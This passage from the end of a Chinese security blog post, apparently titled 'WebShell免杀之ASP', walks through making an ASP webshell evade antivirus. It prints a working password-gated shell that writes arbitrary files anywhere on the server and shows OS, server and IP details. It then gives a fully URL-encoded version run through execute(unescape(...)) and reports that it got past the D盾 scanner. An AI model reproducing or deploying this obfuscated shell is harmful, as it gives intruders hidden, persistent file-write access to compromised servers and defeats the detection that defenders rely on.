+</span></span><span class="line"><span class="cl">err.clear
+</span></span><span class="line"><span class="cl">end if
+</span></span><span class="line"><span class="cl">da.close
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span><span class="line"><span class="cl">&lt;%set da=nothing%&gt;
+</span></span><span class="line"><span class="cl">&lt;%set fos=nothing%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;&lt;form action=&#39;&#39; method=post&gt;&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;&lt;input type=text name=path&gt;&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;&lt;br&gt;&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;当前文件路径:&#34;&amp;server.mappath(request.servervariables(&#34;script_name&#34;))%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;&lt;br&gt;&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;操作系统为:&#34;&amp;Request.ServerVariables(&#34;OS&#34;)%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;&lt;br&gt;&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;WEB服务器版本为:&#34;&amp;Request.ServerVariables(&#34;SERVER_SOFTWARE&#34;)%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;&lt;br&gt;&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;服务器的IP为:&#34;&amp;Request.ServerVariables(&#34;LOCAL_ADDR&#34;)%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;&lt;br&gt;&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;&lt;textarea name=da cols=50 rows=10 width=30&gt;&lt;/textarea&gt;&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;&lt;br&gt;&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;&lt;input type=submit value=save&gt;&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;&lt;/form&gt;&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%end if%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427239-1d1aa604-cd29-41e6-b1d5-e29f89334513.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427239-1d1aa604-cd29-41e6-b1d5-e29f89334513.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427239-1d1aa604-cd29-41e6-b1d5-e29f89334513.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427239-1d1aa604-cd29-41e6-b1d5-e29f89334513.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427239-1d1aa604-cd29-41e6-b1d5-e29f89334513.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427239-1d1aa604-cd29-41e6-b1d5-e29f89334513.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>因为只是举例子，就找一个具有文件保存的大马</p>
+<p>扫一下不出意外的被杀</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427428-f7ccf646-4003-4b52-aff7-b03a034cc431.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427428-f7ccf646-4003-4b52-aff7-b03a034cc431.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427428-f7ccf646-4003-4b52-aff7-b03a034cc431.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427428-f7ccf646-4003-4b52-aff7-b03a034cc431.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427428-f7ccf646-4003-4b52-aff7-b03a034cc431.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427428-f7ccf646-4003-4b52-aff7-b03a034cc431.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="代码处理" class="headerLink">
+    <a href="#%e4%bb%a3%e7%a0%81%e5%a4%84%e7%90%86" class="header-mark"></a>4.1 代码处理</h3><p>首先把多余的标签给去掉，只留下中间的代码</p>
+<p><strong>如果采用url编码的话一定要去掉里面所有的中文！</strong></p>
+<p><strong>否则会一直报未结束的字符串常量错误</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">on error resume next
+</span></span><span class="line"><span class="cl">  if request(&#34;pass&#34;)=&#34;g&#34; then
+</span></span><span class="line"><span class="cl">  session(&#34;pw&#34;)=&#34;go&#34;
+</span></span><span class="line"><span class="cl">  end if
+</span></span><span class="line"><span class="cl">if session(&#34;pw&#34;)&lt;&gt;&#34;go&#34; then 
+</span></span><span class="line"><span class="cl">response.write(&#34;&lt;center&gt;&lt;br&gt;&lt;form action=&#39;&#39; method=&#39;post&#39;&gt;&#34;)
+</span></span><span class="line"><span class="cl">response.write(&#34;&lt;input name=&#39;pass&#39; type=&#39;password&#39; size=&#39;10&#39;&gt; &lt;input &#34;)
+</span></span><span class="line"><span class="cl">response.write(&#34;type=&#39;submit&#39; value=&#39;test&#39;&gt;&lt;/center&gt;&#34;)
+</span></span><span class="line"><span class="cl">else
+</span></span><span class="line"><span class="cl">set fso=server.createobject(&#34;scripting.filesystemobject&#34;)
+</span></span><span class="line"><span class="cl">path=request(&#34;path&#34;)
+</span></span><span class="line"><span class="cl">if path&lt;&gt;&#34;&#34; then
+</span></span><span class="line"><span class="cl">data=request(&#34;da&#34;)
+</span></span><span class="line"><span class="cl">set da=fso.createtextfile(path,true)
+</span></span><span class="line"><span class="cl">da.write data
+</span></span><span class="line"><span class="cl">if err=0 then
+</span></span><span class="line"><span class="cl">response.write(&#34;yes&#34;)
+</span></span><span class="line"><span class="cl">else
+</span></span><span class="line"><span class="cl">response.write(&#34;no&#34;)
+</span></span><span class="line"><span class="cl">end if
+</span></span><span class="line"><span class="cl">err.clear
+</span></span><span class="line"><span class="cl">end if
+</span></span><span class="line"><span class="cl">da.close
+</span></span><span class="line"><span class="cl">set da=nothing
+</span></span><span class="line"><span class="cl">set fos=nothing
+</span></span><span class="line"><span class="cl">response.write(&#34;&lt;form action=&#39;&#39; method=post&gt;&#34;)
+</span></span><span class="line"><span class="cl">response.write(&#34;&lt;input type=text name=path&gt;&#34;)
+</span></span><span class="line"><span class="cl">response.write(&#34;&lt;br&gt;&#34;)
+</span></span><span class="line"><span class="cl">response.write(&#34;path:&#34;&amp;server.mappath(request.servervariables(&#34;script_name&#34;)))
+</span></span><span class="line"><span class="cl">response.write(&#34;&lt;br&gt;&#34;)
+</span></span><span class="line"><span class="cl">response.write(&#34;os:&#34;&amp;Request.ServerVariables(&#34;OS&#34;))
+</span></span><span class="line"><span class="cl">response.write(&#34;&lt;br&gt;&#34;)
+</span></span><span class="line"><span class="cl">response.write(&#34;WEB:&#34;&amp;Request.ServerVariables(&#34;SERVER_SOFTWARE&#34;))
+</span></span><span class="line"><span class="cl">response.write(&#34;&lt;br&gt;&#34;)
+</span></span><span class="line"><span class="cl">response.write(&#34;IP:&#34;&amp;Request.ServerVariables(&#34;LOCAL_ADDR&#34;))
+</span></span><span class="line"><span class="cl">response.write(&#34;&lt;br&gt;&#34;)
+</span></span><span class="line"><span class="cl">response.write(&#34;&#34;)
+</span></span><span class="line"><span class="cl">response.write(&#34;&lt;textarea name=da cols=50 rows=10 width=30&gt;&lt;/textarea&gt;&#34;)
+</span></span><span class="line"><span class="cl">response.write(&#34;&lt;br&gt;&#34;)
+</span></span><span class="line"><span class="cl">response.write(&#34;&lt;input type=submit value=save&gt;&#34;)
+</span></span><span class="line"><span class="cl">response.write(&#34;&lt;/form&gt;&#34;)
+</span></span><span class="line"><span class="cl">end if
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后扔到burp里进行url编码</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427560-1640f0f9-ef11-4a7f-9e82-09e51ceff7eb.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427560-1640f0f9-ef11-4a7f-9e82-09e51ceff7eb.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427560-1640f0f9-ef11-4a7f-9e82-09e51ceff7eb.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427560-1640f0f9-ef11-4a7f-9e82-09e51ceff7eb.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427560-1640f0f9-ef11-4a7f-9e82-09e51ceff7eb.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427560-1640f0f9-ef11-4a7f-9e82-09e51ceff7eb.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>然后外层包裹上执行代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">execute (unescape(&#34;%6f%6e%20%65%72%72%6f%72%20%72%65%73%75%6d%65%20%6e%65%78%74%0a%20%20%69%66%20%72%65%71%75%65%73%74%28%22%70%61%73%73%22%29%3d%22%67%22%20%74%68%65%6e%0a%20%20%73%65%73%73%69%6f%6e%28%22%70%77%22%29%3d%22%67%6f%22%0a%20%20%65%6e%64%20%69%66%0a%69%66%20%73%65%73%73%69%6f%6e%28%22%70%77%22%29%3c%3e%22%67%6f%22%20%74%68%65%6e%20%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%63%65%6e%74%65%72%3e%3c%62%72%3e%3c%66%6f%72%6d%20%61%63%74%69%6f%6e%3d%27%27%20%6d%65%74%68%6f%64%3d%27%70%6f%73%74%27%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%69%6e%70%75%74%20%6e%61%6d%65%3d%27%70%61%73%73%27%20%74%79%70%65%3d%27%70%61%73%73%77%6f%72%64%27%20%73%69%7a%65%3d%27%31%30%27%3e%20%3c%69%6e%70%75%74%20%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%74%79%70%65%3d%27%73%75%62%6d%69%74%27%20%76%61%6c%75%65%3d%27%31%32%33%27%3e%3c%2f%63%65%6e%74%65%72%3e%22%29%0a%65%6c%73%65%0a%0a%73%65%74%20%66%73%6f%3d%73%65%72%76%65%72%2e%63%72%65%61%74%65%6f%62%6a%65%63%74%28%22%73%63%72%69%70%74%69%6e%67%2e%66%69%6c%65%73%79%73%74%65%6d%6f%62%6a%65%63%74%22%29%0a%70%61%74%68%3d%72%65%71%75%65%73%74%28%22%70%61%74%68%22%29%0a%69%66%20%70%61%74%68%3c%3e%22%22%20%74%68%65%6e%0a%64%61%74%61%3d%72%65%71%75%65%73%74%28%22%64%61%22%29%0a%73%65%74%20%64%61%3d%66%73%6f%2e%63%72%65%61%74%65%74%65%78%74%66%69%6c%65%28%70%61%74%68%2c%74%72%75%65%29%0a%64%61%2e%77%72%69%74%65%20%64%61%74%61%0a%69%66%20%65%72%72%3d%30%20%74%68%65%6e%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%79%65%73%22%29%0a%65%6c%73%65%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%6e%6f%22%29%0a%65%6e%64%20%69%66%0a%65%72%72%2e%63%6c%65%61%72%0a%65%6e%64%20%69%66%0a%64%61%2e%63%6c%6f%73%65%0a%73%65%74%20%64%61%3d%6e%6f%74%68%69%6e%67%0a%73%65%74%20%66%6f%73%3d%6e%6f%74%68%69%6e%67%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%66%6f%72%6d%20%61%63%74%69%6f%6e%3d%27%27%20%6d%65%74%68%6f%64%3d%70%6f%73%74%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%69%6e%70%75%74%20%74%79%70%65%3d%74%65%78%74%20%6e%61%6d%65%3d%70%61%74%68%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%62%72%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%70%61%74%68%3a%22%26%73%65%72%76%65%72%2e%6d%61%70%70%61%74%68%28%72%65%71%75%65%73%74%2e%73%65%72%76%65%72%76%61%72%69%61%62%6c%65%73%28%22%73%63%72%69%70%74%5f%6e%61%6d%65%22%29%29%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%62%72%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%6f%73%3a%22%26%52%65%71%75%65%73%74%2e%53%65%72%76%65%72%56%61%72%69%61%62%6c%65%73%28%22%4f%53%22%29%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%62%72%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%57%45%42%3a%22%26%52%65%71%75%65%73%74%2e%53%65%72%76%65%72%56%61%72%69%61%62%6c%65%73%28%22%53%45%52%56%45%52%5f%53%4f%46%54%57%41%52%45%22%29%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%62%72%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%49%50%3a%22%26%52%65%71%75%65%73%74%2e%53%65%72%76%65%72%56%61%72%69%61%62%6c%65%73%28%22%4c%4f%43%41%4c%5f%41%44%44%52%22%29%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%62%72%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%74%65%78%74%61%72%65%61%20%6e%61%6d%65%3d%64%61%20%63%6f%6c%73%3d%35%30%20%72%6f%77%73%3d%31%30%20%77%69%64%74%68%3d%33%30%3e%3c%2f%74%65%78%74%61%72%65%61%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%62%72%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%69%6e%70%75%74%20%74%79%70%65%3d%73%75%62%6d%69%74%20%76%61%6c%75%65%3d%73%61%76%65%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%2f%66%6f%72%6d%3e%22%29%0a%65%6e%64%20%69%66&#34;))
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先试一下能不能运行</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427667-4e504625-06df-4b60-878f-ed0b2f58aa99.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427667-4e504625-06df-4b60-878f-ed0b2f58aa99.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427667-4e504625-06df-4b60-878f-ed0b2f58aa99.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427667-4e504625-06df-4b60-878f-ed0b2f58aa99.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427667-4e504625-06df-4b60-878f-ed0b2f58aa99.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427667-4e504625-06df-4b60-878f-ed0b2f58aa99.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>保存个文件试试</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427780-8cc387cd-c1be-4d0f-ad47-d870f855bac5.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427780-8cc387cd-c1be-4d0f-ad47-d870f855bac5.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427780-8cc387cd-c1be-4d0f-ad47-d870f855bac5.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427780-8cc387cd-c1be-4d0f-ad47-d870f855bac5.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427780-8cc387cd-c1be-4d0f-ad47-d870f855bac5.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427780-8cc387cd-c1be-4d0f-ad47-d870f855bac5.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427865-cb5b71e8-27e2-4303-bc74-32f399e7b297.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427865-cb5b71e8-27e2-4303-bc74-32f399e7b297.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427865-cb5b71e8-27e2-4303-bc74-32f399e7b297.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427865-cb5b71e8-27e2-4303-bc74-32f399e7b297.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427865-cb5b71e8-27e2-4303-bc74-32f399e7b297.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427865-cb5b71e8-27e2-4303-bc74-32f399e7b297.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>保存成功</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427956-48c09fa8-d5ec-408a-a6b2-65c62ba366a5.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427956-48c09fa8-d5ec-408a-a6b2-65c62ba366a5.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427956-48c09fa8-d5ec-408a-a6b2-65c62ba366a5.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427956-48c09fa8-d5ec-408a-a6b2-65c62ba366a5.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427956-48c09fa8-d5ec-408a-a6b2-65c62ba366a5.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427956-48c09fa8-d5ec-408a-a6b2-65c62ba366a5.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>用D盾扫一扫，直接就bypass了。。。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428042-cfe08805-846c-4160-9b23-dbc4ba326ac7.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428042-cfe08805-846c-4160-9b23-dbc4ba326ac7.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428042-cfe08805-846c-4160-9b23-dbc4ba326ac7.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428042-cfe08805-846c-4160-9b23-dbc4ba326ac7.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428042-cfe08805-846c-4160-9b23-dbc4ba326ac7.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428042-cfe08805-846c-4160-9b23-dbc4ba326ac7.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>看来D盾对于超长字符串参数也是不敏感</p>
+<h2 id="最后" class="headerLink">
+    <a href="#%e6%9c%80%e5%90%8e" class="header-mark"></a>5 最后</h2><p>套路都是差不多的，自己多动手，想一想，你肯定能做的比我更好。</p>
+</div>
+
+        
+
+
+<h2>相关内容</h2>
+<div class="related-container">
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/tomcat-memory-webshell-filter/">Tomcat内存Webshell解析之Filter型</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/jsp-classload-backdoor/">[知识星球]JSP类加载后门</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/webshell-bypass-jsp/">WebShell免杀之JSP</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/shellcode-bypass-360-3/">MSF免杀360&#43;火绒上线(三)</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/shellcode-bypass-360-2/">MSF免杀360&#43;火绒上线(二)</a>
+            </h2>
+        </div>
+    
+
+</div>
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2019-10-02</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/webshell-bypass-asp/" data-title="[知识星球]WebShell免杀之ASP" data-hashtags="webshell,免杀"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/webshell-bypass-asp/" data-hashtag="webshell"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/webshell-bypass-asp/" data-title="[知识星球]WebShell免杀之ASP"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/webshell-bypass-asp/" data-title="[知识星球]WebShell免杀之ASP"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/webshell-bypass-asp/" data-title="[知识星球]WebShell免杀之ASP"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/webshell-bypass-asp/" data-title="[知识星球]WebShell免杀之ASP" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;[知识星球]WebShell免杀之ASP&#34;, &#34;https://yzddmr6.com/posts/webshell-bypass-asp/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/webshell/">webshell</a>,&nbsp;<a href="/tags/%E5%85%8D%E6%9D%80/">免杀</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/hack-pubg-cheat-site-1/" class="prev" rel="prev" title="向吃鸡外挂站开炮（一）"><i class="fas fa-angle-left fa-fw"></i>向吃鸡外挂站开炮（一）</a>
+            <a href="/posts/xm-one-year-awd/" class="next" rel="next" title="“北极星杯”AWD线上赛复盘">“北极星杯”AWD线上赛复盘<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
